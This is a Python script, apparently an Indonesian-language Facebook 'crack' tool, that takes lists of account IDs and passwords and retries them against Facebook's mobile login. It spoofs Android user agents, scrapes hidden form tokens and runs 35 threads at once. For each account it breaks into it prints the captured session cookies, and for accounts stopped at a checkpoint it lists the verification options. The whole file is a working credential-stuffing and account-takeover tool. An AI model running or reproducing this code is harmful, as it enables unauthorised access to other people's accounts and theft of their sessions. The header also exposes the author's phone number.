#--> Author's Info
Author    = 'Dapunta Khurayra X'
Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
Instagram = 'Instagram.com/Dapunta.Ratya'
Whatsapp  = '082245780524'
YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'

#--> Import Module
import os, sys, bs4, requests, re, random, time, itertools
from datetime import datetime
from itertools import zip_longest
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor
try: import CP
except Exception as e: pass
try: import OK
except Exception as e: pass

#--> Style Warna
Z = '\x1b[38;5;232m' # Hitam
M = '\x1b[38;5;196m' # Merah
H = '\x1b[38;5;46m'  # Hijau
K = '\x1b[38;5;226m' # Kuning
B = '\x1b[38;5;44m'  # Biru
U = '\x1b[38;5;54m'  # Ungu
O = '\x1b[38;5;51m'  # Biru Muda
P = '\x1b[38;5;231m' # Putih
J = '\x1b[38;5;208m' # Jingga
A = '\x1b[38;5;248m' # Abu-Abu

#--> Clear Terminal
def clear():
    if "linux" in sys.platform.lower():os.system('clear')
    elif "win" in sys.platform.lower():os.system('cls')

#--> User Agent Vivo
def random_ua_vivo():
    a = random.randrange(110,113)
    b = random.randrange(1000,10000)
    c = random.randrange(10,100)
    os_ver = random.randrange(10,13)                                                            #--> OS Version
    dv_typ = random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160']) #--> Device Type
    bl_typ = random.choice(['RP1A','PKQ1','QP1A','TP1A'])                                       #--> Build Type
    dv_ver = random.randrange(100000,250000)                                                    #--> Device Version
    sd_ver = random.randrange(1,10)                                                             #--> Update Version
    ch_ver = f'{a}.0.{b}.{c}'                                                                   #--> Chrome Version
    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver} Mobile Safari/537.36'
    return(ua)

#--> Convert Cookies
def cvt(st,ran):
    try:
        if st == 'ok': cookie = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(ran['sb'],ran['datr'],ran['c_user'],ran['xs'],ran['fr']))
        elif st == 'cp': cookie = ('checkpoint=%s;datr=%s;fr=%s'%(ran['checkpoint'],ran['datr'],ran['fr']))
    except Exception as e : cookie = 'unknown'
    return(str(cookie))

#--> Main Checker
class main:

    #--> Tampilkan Data
    def __init__(self):
        self.xyz = requests.Session()
        self.isi = 0
        self.ok  = 0
        self.cp  = 0
        ccp = 'CP'
        ook = 'OK'
        dcp = []
        dok = []
        if os.path.isdir(ccp):
            l = os.listdir(ccp)
            for y in l:
                dcp.append('CP/%s'%(y))
        else: pass
        if os.path.isdir(ook):
            l = os.listdir(ook)
            for y in l:
                dok.append('OK/%s'%(y))
        else: pass
        print('\n%s╭%s[ %sCP %s]%s╮  %s╭%s[ %sOK %s]%s╮%s'%(M,'─'*14,P,M,'─'*14,H,'─'*14,P,H,'─'*14,P))
        print('%s│%s│%s%s│%s│%s'%(M,' '*34,' '*2,H,' '*34,P))
        for x,y in zip_longest(dcp,dok,fillvalue=''):
            spd, sp1, sp2 = ' '*5, ' '*(27-len(str(x))), ' '*(27-len(str(y)))
            if x == '': e = ' '
            else: e = '•'
            if y == '': f = ' '
            else: f = '•'
            fmt = f'{M}│{spd}{M}{e} {P}{x}{sp1}{M}│  {H}│{spd}{H}{f} {P}{y}{sp2}{H}│{P}'
            print(fmt)
        print('%s│%s│%s%s│%s│%s'%(M,' '*34,' '*2,H,' '*34,P))
        print('%s╰%s╯  %s╰%s╯%s'%(M,'─'*34,H,'─'*34,P))
        self.pilih()
    
    #--> Sortir Data
    def pilih(self):
        self.lo = 0
        pf = input('%s\n[%s•%s] %sPilih File : %s'%(M,P,M,P,M))
        cf = input('%s[%s•%s] %sCrack Ulang [%sy%s/%st%s] : '%(M,P,M,P,M,P,H,P)).lower()
        print('')
        try:
            op = open(pf,'r').read().splitlines()
            if 'OK' in pf : w = H
            else: w = M
            with ThreadPoolExecutor(max_workers=35) as TPE:
                for x in op:
                    try:
                        id, pw = x.split('|')[0], x.split('|')[1]
                        if cf in ['y','1','01','a']:
                            TPE.submit(self.recrack,id,pw)
                        else:
                            print(f'   {w}--> {id} • {pw}{P}')
                            self.lo += 1
                    except Exception as e: pass
            if self.lo == 0: print('%sMaaf, Belum Ada Hasil :(%s'%(M,P))
            else: print('\n%s[%s•%s] %sTerdapat %s%s %sAkun'%(M,P,M,P,w,str(self.lo),P))
        except Exception as e:
            print('%sFile Tidak Ditemukan!%s'%(M,P))
    
    #--> Crack Ulang
    def recrack(self,id,pw):
        r = requests.Session()
        ua = random_ua_vivo()
        host = 'mbasic.facebook.com'
        url_get = f'https://{host}/login/device-based/password/?uid={id}&flow=login_no_pin'
        headers_get = {'Host':host,'Connection':'keep-alive','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','x-requested-with':'XMLHttpRequest','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="112", "Chromium";v="112"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','sec-fetch-user':'?1','upgrade-insecure-requests':'1','user-agent':ua}
        req_get = bs(r.get(url_get,headers=headers_get).content,'html.parser')
        post_form = req_get.find('form',{'method':'post'})
        data_post = {'lsd':re.search('name="lsd" type="hidden" value="(.*?)"',str(post_form)).group(1),'jazoest':re.search('name="jazoest" type="hidden" value="(.*?)"',str(post_form)).group(1),'next':f'https://{host}/login/save-device/','uid':id,'pass':pw,'flow':'login_no_pin'}
        headers_post = {'Host':host,'Connection':'keep-alive','accept-encoding':'gzip, deflate','cache-control':'max-age=0','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','content-type':'application/x-www-form-urlencoded','origin':f'https://{host}','referer':url_get,'x-requested-with':'XMLHttpRequest','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="112", "Chromium";v="112"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','upgrade-insecure-requests':'1','sec-fetch-site':'same-origin','sec-fetch-user':'?1','user-agent':ua}
        url_post = f'https://{host}/login/device-based/validate-password/?shbl=0'
        req_post = bs(r.post(url_post,data=data_post,headers=headers_post,allow_redirects=True).content,'html.parser')
        if 'c_user' in r.cookies.get_dict():
            cookie = cvt('ok',r.cookies.get_dict())
        elif 'checkpoint' in r.cookies.get_dict():
            cookie = cvt('cp',r.cookies.get_dict())
            try:
                raq1 = req_post.find('form',{'method':'post'})
                url1 = 'https://%s%s'%(host,raq1['action'])
                dat1 = {'fb_dtsg':re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(raq1)).group(1),'jazoest':re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq1)).group(1),'nh':re.search('name="nh" type="hidden" value="(.*?)"',str(raq1)).group(1),'submit[Continue]':'Lanjutkan'}
                pos1 = bs(r.post(url1,data=dat1,headers=headers_post,allow_redirects=True).content,'html.parser')
                raq2 = pos1.find('form',{'method':'post'})
                lec1 = raq2.find('select')
                opso = ['\n      %s• %s%s'%(M,P,x.text) for x in lec1.find_all('option')]
                if len(opso) == 0: opsi = '\n      %s• %sTidak Ditemukan Opsi'%(M,P)
                else: opsi = ''.join(opso)
                print('   %s--> %s • %s%s%s'%(M,id,pw,P,opsi))
                self.lo += 1
            except Exception as e: pass
        else: pass

if __name__ == '__main__':
    clear()
    main()
    pass